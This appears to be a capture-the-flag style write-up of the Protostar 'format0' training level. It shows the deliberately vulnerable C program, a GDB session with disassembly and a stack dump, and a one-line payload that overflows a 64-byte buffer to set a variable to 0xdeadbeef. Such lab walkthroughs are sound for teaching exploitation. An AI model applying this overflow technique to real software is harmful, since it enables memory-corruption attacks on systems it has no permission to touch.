```
TL;DR -> `python -c "print 'A' * 64 + '\xef\xbe\xad\xde'"`
```

# Format0

URL: https://exploit.education/protostar/format-zero/

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

Hints

- This level should be done in less than 10 bytes of input.
- “Exploiting format string vulnerabilities”
- This level is at /opt/protostar/bin/format0

Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

# Writeup

As we can see there is a `64` bytes buffer, so let us open GDB and 65 bytes string.

```
user@protostar:/opt/protostar/bin$ gdb format0
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/format0...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x68
0x080483fa <vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:   cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:   mov    DWORD PTR [esp],0x8048510
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:   leave
0x0804842a <vuln+54>:   ret
End of assembler dump.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /opt/protostar/bin/format0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program exited normally.
(gdb) break *0x08048416
Breakpoint 1 at 0x8048416: file format0/format0.c, line 15.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /opt/protostar/bin/format0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048416 in vuln (string=0xbffff956 'A' <repeats 64 times>) at format0/format0.c:15
15      format0/format0.c: No such file or directory.
        in format0/format0.c
(gdb) x/24x $esp
0xbffff6e0:     0xbffff6fc      0xbffff956      0x080481e8      0xbffff778
0xbffff6f0:     0xb7fffa54      0x00000000      0xb7fe1b28      0x41414141
0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x00000000
(gdb)
```

Now, it seems pretty simple, replace the buffer with `0xdeadbeef`

Therefore, the payload will be `python -c "print 'A' * 64 + '\xef\xbe\xad\xde'"`

Solution:

```
./format0 $(python -c "print 'A' * 64 + '\xef\xbe\xad\xde'")
```
